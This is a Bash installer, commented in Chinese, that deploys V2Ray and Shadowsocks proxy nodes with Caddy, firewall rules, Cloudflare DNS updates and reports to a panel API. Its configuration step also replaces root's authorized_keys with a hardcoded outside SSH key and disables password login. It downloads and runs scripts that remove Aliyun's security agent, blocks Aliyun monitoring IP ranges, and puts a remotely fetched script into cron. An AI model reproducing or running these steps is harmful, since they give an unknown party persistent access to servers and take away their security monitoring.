#!/bin/bash

red='\e[91m'
green='\e[92m'
yellow='\e[93m'
magenta='\e[95m'
cyan='\e[96m'
none='\e[0m'
_red() { echo -e ${red}$*${none}; }
_green() { echo -e ${green}$*${none}; }
_yellow() { echo -e ${yellow}$*${none}; }
_magenta() { echo -e ${magenta}$*${none}; }
_cyan() { echo -e ${cyan}$*${none}; }

# Root
[[ $(id -u) != 0 ]] && echo -e "\n 哎呀……请使用 ${red}root ${none}用户运行 ${yellow}~(^_^) ${none}\n" && exit 1

cmd="apt-get"

sys_bit=$(uname -m)

case $sys_bit in
i[36]86)
	v2ray_bit="32"
	caddy_arch="386"
	;;
x86_64)
	v2ray_bit="64"
	caddy_arch="amd64"
	;;
*armv6*)
	v2ray_bit="arm"
	caddy_arch="arm6"
	;;
*armv7*)
	v2ray_bit="arm"
	caddy_arch="arm7"
	;;
*aarch64* | *armv8*)
	v2ray_bit="arm64"
	caddy_arch="arm64"
	;;
*)
	echo -e " 
	哈哈……这个 ${red}辣鸡脚本${none} 不支持你的系统。 ${yellow}(-_-) ${none}

	备注: 仅支持 Ubuntu 16+ / Debian 8+ / CentOS 7+ 系统
	" && exit 1
	;;
esac

# 笨笨的检测方法
if [[ $(command -v apt-get) || $(command -v yum) ]] && [[ $(command -v systemctl) ]]; then

	if [[ $(command -v yum) ]]; then

		cmd="yum"

	fi

else

	echo -e " 
	哈哈……这个 ${red}辣鸡脚本${none} 不支持你的系统。 ${yellow}(-_-) ${none}

	备注: 仅支持 Ubuntu 16+ / Debian 8+ / CentOS 7+ 系统
	" && exit 1

fi

uuid=$(cat /proc/sys/kernel/random/uuid)
old_id="e55c8d17-2cf3-b21a-bcf1-eeacb011ed79"
v2ray_server_config="/etc/v2ray/config.json"
v2ray_client_config="/etc/v2ray/233blog_v2ray_config.json"
backup="/etc/v2ray/233blog_v2ray_backup.conf"
_v2ray_sh="/usr/local/sbin/v2ray"
systemd=true
# _test=true

transport=(
	TCP
	TCP_HTTP
	WebSocket
	"WebSocket + TLS"
	HTTP/2
	mKCP
	mKCP_utp
	mKCP_srtp
	mKCP_wechat-video
	mKCP_dtls
	mKCP_wireguard
	QUIC
	QUIC_utp
	QUIC_srtp
	QUIC_wechat-video
	QUIC_dtls
	QUIC_wireguard
	TCP_dynamicPort
	TCP_HTTP_dynamicPort
	WebSocket_dynamicPort
	mKCP_dynamicPort
	mKCP_utp_dynamicPort
	mKCP_srtp_dynamicPort
	mKCP_wechat-video_dynamicPort
	mKCP_dtls_dynamicPort
	mKCP_wireguard_dynamicPort
	QUIC_dynamicPort
	QUIC_utp_dynamicPort
	QUIC_srtp_dynamicPort
	QUIC_wechat-video_dynamicPort
	QUIC_dtls_dynamicPort
	QUIC_wireguard_dynamicPort
)

ciphers=(
	aes-128-cfb
	aes-256-cfb
	chacha20
	chacha20-ietf
	aes-128-gcm
	aes-256-gcm
	chacha20-ietf-poly1305
)

_load() {
	local _dir="/etc/v2ray/233boy/v2ray/src/"
	. "${_dir}$@"
}
_sys_timezone() {
	IS_OPENVZ=
	if hostnamectl status | grep -q openvz; then
		IS_OPENVZ=1
	fi

	echo
	timedatectl set-timezone Asia/Shanghai
	timedatectl set-ntp true
	echo "已将你的主机设置为Asia/Shanghai时区并通过systemd-timesyncd自动同步时间。"
	echo

	if [[ $IS_OPENVZ ]]; then
		echo
		echo -e "你的主机环境为 ${yellow}Openvz${none} ，建议使用${yellow}v2ray mkcp${none}系列协议。"
		echo -e "注意：${yellow}Openvz${none} 系统时间无法由虚拟机内程序控制同步。"
		echo -e "如果主机时间跟实际相差${yellow}超过90秒${none}，v2ray将无法正常通信，请发ticket联系vps主机商调整。"
	fi
}

_sys_time() {
	echo -e "\n主机时间：${yellow}"
	timedatectl status | sed -n '1p;4p'
	echo -e "${none}"
	[[ $IS_OPENV ]] && pause
}

install_caddy() {
	# download caddy file then install
	_load download-caddy.sh
	_download_caddy_file
	_install_caddy_service
	#获取caddy 自己的ssl
	_caddy_tls_get
	caddy_config

}
caddy_config() {
	# local email=$(shuf -i1-10000000000 -n1)
	_load caddy-config.sh
	# systemctl restart caddy
	do_service restart caddy
}

install_v2ray() {
	$cmd update -y
	if [[ $cmd == "apt-get" ]]; then
		$cmd install -y lrzsz git zip unzip curl wget qrencode libcap2-bin dbus
	else
		# $cmd install -y lrzsz git zip unzip curl wget qrencode libcap iptables-services
		$cmd install -y lrzsz git zip unzip curl wget qrencode libcap
	fi
	ln -sf /usr/share/zoneinfo/Asia/Shanghai /etc/localtime
	[ -d /etc/v2ray ] && rm -rf /etc/v2ray
	# date -s "$(curl -sI g.cn | grep Date | cut -d' ' -f3-6)Z"
	_sys_timezone
	_sys_time

	if [[ $local_install ]]; then
		if [[ ! -d $(pwd)/config ]]; then
			echo
			echo -e "$red 哎呀呀...安装失败了咯...$none"
			echo
			echo -e " 请确保你有完整的上传 233v2.com 的 V2Ray 一键安装脚本 & 管理脚本到当前 ${green}$(pwd) $none目录下"
			echo
			exit 1
		fi
		mkdir -p /etc/v2ray/233boy/v2ray
		cp -rf $(pwd)/* /etc/v2ray/233boy/v2ray
	else
		pushd /tmp
		git clone https://github.com/supersongssr/v2ray -b "$_gitbranch" /etc/v2ray/233boy/v2ray --depth=1
		popd

	fi

	if [[ ! -d /etc/v2ray/233boy/v2ray ]]; then
		echo
		echo -e "$red 哎呀呀...克隆脚本仓库出错了...$none"
		echo
		echo -e " 温馨提示..... 请尝试自行安装 Git: ${green}$cmd install -y git $none 之后再安装此脚本"
		echo
		exit 1
	fi

	# download v2ray file then install
	_load download-v2ray.sh
	_download_v2ray_file
	_install_v2ray_service
	#获取 tls配置文件 放入 /etc/tls
	_mkdir_dir
}

open_port() {
	if [[ $cmd == "apt-get" ]]; then
		if [[ $1 != "multiport" ]]; then

			iptables -I INPUT -m state --state NEW -m tcp -p tcp --dport $1 -j ACCEPT
			iptables -I INPUT -m state --state NEW -m udp -p udp --dport $1 -j ACCEPT
			ip6tables -I INPUT -m state --state NEW -m tcp -p tcp --dport $1 -j ACCEPT
			ip6tables -I INPUT -m state --state NEW -m udp -p udp --dport $1 -j ACCEPT

			# firewall-cmd --permanent --zone=public --add-port=$1/tcp
			# firewall-cmd --permanent --zone=public --add-port=$1/udp
			# firewall-cmd --reload

		else

			local multiport="${v2ray_dynamic_port_start_input}:${v2ray_dynamic_port_end_input}"
			iptables -I INPUT -p tcp --match multiport --dports $multiport -j ACCEPT
			iptables -I INPUT -p udp --match multiport --dports $multiport -j ACCEPT
			ip6tables -I INPUT -p tcp --match multiport --dports $multiport -j ACCEPT
			ip6tables -I INPUT -p udp --match multiport --dports $multiport -j ACCEPT

			# local multi_port="${v2ray_dynamic_port_start_input}-${v2ray_dynamic_port_end_input}"
			# firewall-cmd --permanent --zone=public --add-port=$multi_port/tcp
			# firewall-cmd --permanent --zone=public --add-port=$multi_port/udp
			# firewall-cmd --reload

		fi
		iptables-save >/etc/iptables.rules.v4
		ip6tables-save >/etc/iptables.rules.v6
		# else
		# 	service iptables save >/dev/null 2>&1
		# 	service ip6tables save >/dev/null 2>&1
	fi
#song 这里添加了 centos yum下的 firewalld开启 端口的方法
	if [[ $cmd == "yum" ]]; then
		systemctl restart firewalld
		if [[ $1 != "multiport" ]]; then

			firewall-cmd --permanent --zone=public --add-port=$1/tcp
			firewall-cmd --permanent --zone=public --add-port=$1/udp
			firewall-cmd --reload

		else

			local multiport="${v2ray_dynamic_port_start_input}:${v2ray_dynamic_port_end_input}"

			local multi_port="${v2ray_dynamic_port_start_input}-${v2ray_dynamic_port_end_input}"
			firewall-cmd --permanent --zone=public --add-port=$multi_port/tcp
			firewall-cmd --permanent --zone=public --add-port=$multi_port/udp
			firewall-cmd --reload
		fi
	fi
}

config() {
	cp -f /etc/v2ray/233boy/v2ray/config/backup.conf $backup
	cp -f /etc/v2ray/233boy/v2ray/v2ray.sh $_v2ray_sh
	chmod +x $_v2ray_sh

	v2ray_id=$uuid
	alterId=16
	ban_bt=true
	if [[ $v2ray_transport -ge 18 ]]; then
		v2ray_dynamicPort_start=${v2ray_dynamic_port_start_input}
		v2ray_dynamicPort_end=${v2ray_dynamic_port_end_input}
	fi
	_load config.sh

	if [[ $cmd == "apt-get" ]]; then
		cat >/etc/network/if-pre-up.d/iptables <<-EOF
			#!/bin/sh
			/sbin/iptables-restore < /etc/iptables.rules.v4
			/sbin/ip6tables-restore < /etc/iptables.rules.v6
		EOF
		chmod +x /etc/network/if-pre-up.d/iptables
		# else
		# 	[ $(pgrep "firewall") ] && systemctl stop firewalld
		# 	systemctl mask firewalld
		# 	systemctl disable firewalld
		# 	systemctl enable iptables
		# 	systemctl enable ip6tables
		# 	systemctl start iptables
		# 	systemctl start ip6tables
	fi

	[[ $shadowsocks ]] && open_port $ssport
	if [[ $v2ray_transport == [45] ]]; then
		open_port "80"
		open_port "443"
		open_port $v2ray_port
	elif [[ $v2ray_transport -ge 18 ]]; then
		open_port $v2ray_port
		open_port "multiport"
	else
		open_port $v2ray_port
	fi
	# systemctl restart v2ray
	do_service restart v2ray
	backup_config

}

backup_config() {
	sed -i "18s/=1/=$v2ray_transport/; 21s/=2333/=$v2ray_port/; 24s/=$old_id/=$uuid/" $backup
	if [[ $v2ray_transport -ge 18 ]]; then
		sed -i "30s/=10000/=$v2ray_dynamic_port_start_input/; 33s/=20000/=$v2ray_dynamic_port_end_input/" $backup
	fi
	if [[ $shadowsocks ]]; then
		sed -i "42s/=/=true/; 45s/=6666/=$ssport/; 48s/=233blog.com/=$sspass/; 51s/=chacha20-ietf/=$ssciphers/" $backup
	fi
	[[ $v2ray_transport == [45] ]] && sed -i "36s/=233blog.com/=$domain/" $backup
	[[ $caddy ]] && sed -i "39s/=/=true/" $backup
	[[ $ban_ad ]] && sed -i "54s/=/=true/" $backup
	if [[ $is_path ]]; then
		sed -i "57s/=/=true/; 60s/=233blog/=$path/" $backup
		sed -i "63s#=https://liyafly.com#=$proxy_site#" $backup
	fi
}

get_ip() {
	ip=$(curl -s https://ipinfo.io/ip)
	[[ -z $ip ]] && ip=$(curl -s https://api.ip.sb/ip)
	[[ -z $ip ]] && ip=$(curl -s https://api.ipify.org)
	[[ -z $ip ]] && ip=$(curl -s https://ip.seeip.org)
	[[ -z $ip ]] && ip=$(curl -s https://ifconfig.co/ip)
	[[ -z $ip ]] && ip=$(curl -s https://api.myip.com | grep -oE "([0-9]{1,3}\.){3}[0-9]{1,3}")
	[[ -z $ip ]] && ip=$(curl -s icanhazip.com)
	[[ -z $ip ]] && ip=$(curl -s myip.ipip.net | grep -oE "([0-9]{1,3}\.){3}[0-9]{1,3}")
	[[ -z $ip ]] && echo -e "\n$red 这垃圾小鸡扔了吧！$none\n" && exit
}

error() {

	echo -e "\n$red 输入错误！$none\n"

}

do_service() {
	if [[ $systemd ]]; then
		systemctl $1 $2
	else
		service $2 $1
	fi
}
show_config_info() {
	clear
	_load v2ray-info.sh
	_v2_args
	_v2_info
	_load ss-info.sh
}

v2s1_install() {
	install_v2ray
	if [[ $caddy || $v2ray_port == "80" ]]; then
		if [[ $cmd == "yum" ]]; then
			[[ $(pgrep "httpd") ]] && systemctl stop httpd
			[[ $(command -v httpd) ]] && yum remove httpd -y
		else
			[[ $(pgrep "apache2") ]] && service apache2 stop
			[[ $(command -v apache2) ]] && apt-get remove apache2* -y
		fi
	fi
	[[ $caddy ]] && install_caddy

	## bbr
	_load bbr.sh
	_try_enable_bbr

	get_ip
	config
	show_config_info

	#配置 1 登录密钥 2 Net_check文件 3 aliyun防护 4 CF DNS处理 5 caddy配置和安装 6 vnstat安装 
	v2s1_config
}

#服务器更换Key密钥登陆
sshd_Key(){
    cd 
    test -e .ssh || mkdir .ssh   #如果文件夹不存在就创建一个
    cd .ssh
    echo "" > authorized_keys
    echo 'ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEAoilQplZNXd1Xz+nyKAq5zDyhM0fsi0PscCpF99jSvGtUmvkT04+JcSD1QkNMLSEg1hx6i5XgK/UYFY2LAQx6Me6oVz1jGyJg2elNBBEZyapTLSsKE5v9RZWBRygGsArvI1lshsSIu/T9b8njCPv7tqFrivMTCKjSA2Te9fgF3539wwep4OhK1ZdHmTpCpM4M0Mh4S1U/rPucBlpbY4s+L0kloHV7ZkZ6IvtbTKLqwIvJoDYNKU74sKCAT2gX2k8v5RGjowQyKlDt7V0JAlxafhBSza5c1ju9s1yCCxqVtCysJxnvfMGM0SFg/bGAwjiFzQtbpbvzAbSS3y2/VaE1uQ== mumaxiaoyaorhythm@gmail.com' > authorized_keys
    sed -i -e "s/#PubkeyAuthentication yes/PubkeyAuthentication yes/g" -i -e "s/PasswordAuthentication yes/PasswordAuthentication no/g" /etc/ssh/sshd_config
    service sshd restart
}

#阿里云盾卸载
aliyun_Uninstall(){
    echo 'ban aliyun ips '
    wget -t 1 -T 7 http://update.aegis.aliyun.com/download/uninstall.sh
    #新增 超时 和 重试次数
    chmod +x uninstall.sh
    ./uninstall.sh
    wget -t 1 -T 7 http://update.aegis.aliyun.com/download/quartz_uninstall.sh
    #新增 超时 和 重试次数
    chmod +x quartz_uninstall.sh
    ./quartz_uninstall.sh
    pkill aliyun-service
    rm -fr /etc/init.d/agentwatch /usr/sbin/aliyun-service
    rm -rf /usr/local/aegis*
    iptables -I INPUT -s 140.205.201.0/28 -j DROP
    iptables -I INPUT -s 140.205.201.16/29 -j DROP
    iptables -I INPUT -s 140.205.201.32/28 -j DROP
    iptables -I INPUT -s 140.205.225.192/29 -j DROP
    iptables -I INPUT -s 140.205.225.200/30 -j DROP
    iptables -I INPUT -s 140.205.225.184/29 -j DROP
    iptables -I INPUT -s 140.205.225.183/32 -j DROP
    iptables -I INPUT -s 140.205.225.206/32 -j DROP
    iptables -I INPUT -s 140.205.225.205/32 -j DROP
    iptables -I INPUT -s 140.205.225.195/32 -j DROP
    iptables -I INPUT -s 140.205.225.204/32 -j DROP
    echo 'ban aliyun ips done '
}

#自动检测网络功能
net_Check(){
    #流量统计并自动重置脚本
    cd;
    [[ -e /root/Net_check.sh ]] || wget https://ssrdownloads.oss-ap-southeast-1.aliyuncs.com/Net_check.sh
    chmod +x Net_check.sh
    #获取当前VPS的网卡值
    test -e /sys/class/net/venet0 && net_card=venet0
    test -e /sys/class/net/ens3 && net_card=ens3
    test -e /sys/class/net/eth0 && net_card=eth0
    Date_min=`date +%M`
    #检测是否安装crond
    test -e /usr/sbin/crond || (yum install crontabs ;systemctl enable crond )
    #先删除 包含有 Net_check的那一行，然后再添加！ 
    sed -i -e "/Net_check.sh/d" /etc/crontab
    echo "$Date_min * * * * root /root/Net_check.sh $trans_limit $reset_day $rx_tx $net_card" >> /etc/crontab
}

# CloudFlare DNS Conf
cf_Dns_Config(){
    echo 'cf dns start '
    record_name=$1$2.$3  #需要记录的host
    auth_email=$cf_email   #CF掌控
    auth_key=$cf_key     #cfkey
    zone_name=$3
    add_name=$1$2
    # MAYBE CHANGE THESE
    #dnsip=`curl -4 ip.sb`
    dnsip=$node_ip
    #是否开启CDN功能
    proxied=$4
    # SCRIPT START
    zone_identifier=$(curl -s -X GET "https://api.cloudflare.com/client/v4/zones?name=$zone_name" -H "X-Auth-Email: $auth_email" -H "X-Auth-Key: $auth_key" -H "Content-Type: application/json" | grep -Po '(?<="id":")[^"]*' | head -1 )
    record_identifier=$(curl -s -X GET "https://api.cloudflare.com/client/v4/zones/$zone_identifier/dns_records?name=$record_name" -H "X-Auth-Email: $auth_email" -H "X-Auth-Key: $auth_key" -H "Content-Type: application/json"  | grep -Po '(?<="id":")[^"]*')
    record4=$(curl -s -X GET "https://api.cloudflare.com/client/v4/zones/$zone_identifier/dns_records?name=$record_name&type=A" -H "X-Auth-Email: $auth_email" -H "X-Auth-Key: $auth_key" -H "Content-Type: application/json")
    #check if new
    #[[ $record4 == *"\"count\":0"* ]] && $(curl -X POST "https://api.cloudflare.com/client/v4/zones/$zone_identifier/dns_records"   -H "X-Auth-Email:$auth_email"  -H "X-Auth-Key:$auth_key"   -H "Content-Type:application/json"   --data '{"type":"A","name":"'"$add_name"'","content":"'"$dnsip"'","ttl":1,"priority":10,"proxied":false}') || $(curl -s -X PUT "https://api.cloudflare.com/client/v4/zones/$zone_identifier/dns_records/$record_identifier" -H "X-Auth-Email: $auth_email" -H "X-Auth-Key: $auth_key" -H "Content-Type: application/json" --data "{\"id\":\"$zone_identifier\",\"type\":\"A\",\"name\":\"$record_name\",\"content\":\"$dnsip\"}")
    [[ $record4 == *"\"count\":0"* ]] && $(curl -X POST "https://api.cloudflare.com/client/v4/zones/$zone_identifier/dns_records"   -H "X-Auth-Email:$auth_email"  -H "X-Auth-Key:$auth_key"   -H "Content-Type:application/json"   --data '{"type":"A","name":"'"$add_name"'","content":"'"$dnsip"'","ttl":1,"priority":10,"proxied":'"$proxied"'}') || $(curl -s -X PUT "https://api.cloudflare.com/client/v4/zones/$zone_identifier/dns_records/$record_identifier" -H "X-Auth-Email: $auth_email" -H "X-Auth-Key: $auth_key" -H "Content-Type: application/json" --data '{"type":"A","name":"'"$add_name"'","content":"'"$dnsip"'","ttl":1,"priority":10,"proxied":'"$proxied"'}')
    ####end
    echo 'cf host dns done '
} 

v2ray_Sub(){
        #获取参数
        node_id=$1  #获取前缀中的数字ID
        server=$2   #获取网站 API
        #获取 V2 和 SR的 值，因为同时存在两个版本的 V2 所以，就这么设计了
        test -e /tmp/v2 && v2=$(cat /tmp/v2)
        test -e /tmp/s1 && s1=$(cat /tmp/s1)
        #api 上报信息
        curl -d "s1=$s1&v2=$v2" http://$server/api/ssn_v2/$node_id
}

##安装vnstat流量统计脚本
vnstat_Install(){
        echo 'vnstat install start'
        yum -y install epel-release
        yum -y update
        yum -y install vnstat
        systemctl enable vnstat
        systemctl restart vnstat
        echo 'vnstat intall done '
}

v2s1_config(){
	#配置 登录密钥
	sshd_Key
	#阿里云顿卸载
	aliyun_Uninstall
	#Net_check
	[[ -e /root/Net_check.sh ]] || net_Check 
	#写入域名记录
	[[ $s_s1 ]] && sed -i -e "s/api_Curl $s_s1 $s_ssn//g" /root/Net_check.sh && echo "api_Curl $s_s1 $s_ssn " >> /root/Net_check.sh
	[[ $s_v2 ]] && sed -i -e "s/api_Curl $s_v2 $s_ssn//g" /root/Net_check.sh && echo "api_Curl $s_v2 $s_ssn " >> /root/Net_check.sh
	[[ $n_s1 ]] && sed -i -e "s/api_Curl $n_s1 $n_ssn//g" /root/Net_check.sh && echo "api_Curl $n_s1 $n_ssn " >> /root/Net_check.sh
	[[ $n_v2 ]] && sed -i -e "s/api_Curl $n_v2 $n_ssn//g" /root/Net_check.sh && echo "api_Curl $n_v2 $n_ssn " >> /root/Net_check.sh

	#将域名解析写入到host文件
	echo s$s_s1 >> /root/host
	echo s$s_v2 >> /root/host
	echo n$n_s1 >> /root/host
	echo n$n_v2 >> /root/host
	
	#这里先解析DNS
	#CF_DNS
	#DNS配置
	[[ $s_s1 ]] && cf_Dns_Config s $s_s1 $s_host $cf_cdn
	sleep 2 
	[[ $n_s1 ]] && cf_Dns_Config n $n_s1 $n_host $cf_cdn
	sleep 2 
	[[ $s_v2 ]] && cf_Dns_Config s $s_v2 $s_host false
	sleep 2  
	[[ $n_v2 ]] && cf_Dns_Config n $n_v2 $n_host false
	sleep 2 

	#v2ray sub 上传数据
	[[ $s_s1 ]] && v2ray_Sub $s_s1 $s_ssn
	sleep 2 
	[[ $s_v2 ]] && v2ray_Sub $s_v2 $s_ssn
	sleep 2 

	[[ $n_s1 ]] && v2ray_Sub $n_s1 $n_ssn
	sleep 2 
	[[ $n_v2 ]] && v2ray_Sub $n_v2 $n_ssn
	sleep 2 

	[[ $s_s1 ]] && v2ray_Sub $s_s1 $s_ssn
	sleep 2 
	[[ $s_v2 ]] && v2ray_Sub $s_v2 $s_ssn
	sleep 2 

	[[ $n_s1 ]] && v2ray_Sub $n_s1 $n_ssn
	sleep 2 
	[[ $n_v2 ]] && v2ray_Sub $n_v2 $n_ssn
	sleep 2 

	#vnstat安装 当检测不到 vnstat 时候，就安装之
	[[ -e /usr/bin/vnstat ]] || vnstat_Install
}	

#####start 现在开始
#常用的参数和配置：
#S站 SS 节点
s_s1=$1
[[ $s_s1 == [Nn] ]] && s_s1=''
#S站 V2节点
s_v2=$2
[[ $s_v2 == [Nn] ]] && s_v2=''
#N站 SS 节点
n_s1=$3
[[ $n_s1 == [Nn] ]] && n_s1=''
#N站 V2节点
n_v2=$4
[[ $n_v2 == [Nn] ]] && n_v2=''
#NetCheck相关
node_ip=`curl -4 ip.sb`
trans_limit=$5
reset_day=$6
#双倍流量计算？ 0=false 1=true
rx_tx=$7
#S站 主站
s_ssn=$8
s_host=$9
# N站 主站
n_ssn=${10}
n_host=${11}
#cloduflare相关
cf_email=${12}
cf_key=${13}
#开启CDN； true false 
cf_cdn=${14}
#V2ray 配置
#选项 3 ws 4 ws + tls 5 h2
v2ray_transport=${15}
#端口
v2ray_port=${16}
#域名
[[ $s_s1 ]] && domain=s${s_s1}.${s_host} && zone_domain=$s_host
[[ $s_v2 ]] && domain=s${s_v2}.${s_host} && zone_domain=$s_host
[[ $n_s1 ]] && domain=n${n_s1}.${n_host} && zone_domain=$n_host
[[ $n_v2 ]] && domain=n${n_v2}.${n_host} && zone_domain=$n_host
#路径
path=${17}
#反代的网站
proxy_site=${18}
#是否开启caddy 
caddy=true
#是否路径
is_path=true
#SS 配置
#是否配置 SS
shadowsocks=true
#SS 端口
ssport=${19}
#SS 密码自动获取
sspass=${uuid:0:7}
#加密 5 6 7 是 ahead 加密 可以选 7  
ssciphers=${20}
#V2安装 相关参数
args="online"
_gitbranch="master"
#现在开始安装
echo '写入 hostname'
hostnamectl set-hostname S${s_s1}S${s_v2}N${n_s1}N${n_v2}
echo '安装 V2S1开始'
v2s1_install
